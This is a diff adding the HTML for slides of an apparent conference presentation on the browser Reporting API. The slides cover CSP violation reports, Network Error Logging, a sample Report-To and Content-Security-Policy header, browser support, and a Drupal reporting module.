+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<ul>
+						<li>Content Security Policy violations</li>
+						<li>Feature-Policy violations</li>
+						<li>Deprecated feature usage</li>
+						<li>User-agent interventions</li>
+						<li>Network Error Logging</li>
+					</ul>
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<figure class="code">
+						<pre><code class="lang-plaintext">
+							Report-To:
+								{
+									"group": "default",
+									"max-age": 31536000,
+								 	"endpoints": [
+										{ "url": "https://example.com/reporting/default" }
+									]
+								}
+								{
+									"group": "csp",
+									"max-age": 31536000,
+								 	"endpoints": [
+										{ "url": "https://example.com/reporting/csp" }
+									]
+								}
+
+							Content-Security-Policy:
+								default-src: 'self';
+								report-uri htts://example.com/reporting/csp;
+								report-to csp
+						</code></pre>
+					</figure>
+				</div>
+			</section>
+			<section id="reporting-support" class="support">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<figure>
+						<table>
+							<tr class="browsers">
+								<th></th>
+								<th><i class="fab fa-chrome"></i></th>
+								<th><i class="fab fa-firefox"></i></th>
+								<th><i class="fab fa-safari"></i></th>
+								<th><i class="fab fa-edge"></i></th>
+							</tr>
+							<tr>
+								<td></td>
+								<td><i class="fa fa-check yes"></i></td>
+								<td><i class="fa fa-times no"></i></td>
+								<td><i class="fa fa-times no"></i></td>
+								<td><i class="fa fa-times no"></i></td>
+							</tr>
+						</table>
+					</figure>
+				</div>
+				<aside class="notes">
+					Firefox feature flag, limited directive support
+				</aside>
+			</section>
+			<section id="reporting-module" class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/reporting-module/reporting-module.png" alt="Reporting API Drupal module project page" />
+				</div>
+			</section>
+			<section id="reporting-module-csp" class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/reporting-module/csp-reporting-endpoint.png" alt="Reporting API Drupal module integration with Content Security Policy module" />
+				</div>
+			</section>
+			<section class="references">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<span>References</span>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<ul>
+						<li><a href="https://scotthelme.co.uk/network-error-logging-deep-dive/">Network Error Logging: Deep Dive <br>- Scott Helme</a></li>
+					</ul>
+				</div>
+			</section>
+		</section>
+
+		<section id="end" class="color--midnight">
+			<div class="grid-wrapper">
+				<div class="content">
+					<a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a>
+				</div>
+			</div>
+		</section>
+	</div>
+</div>
+
+<script src="lib/js/head.min.js"></script>
+<script src="js/reveal.js"></script>
+<script src="js/reveal-init.js"></script>
+</body>
+</html>
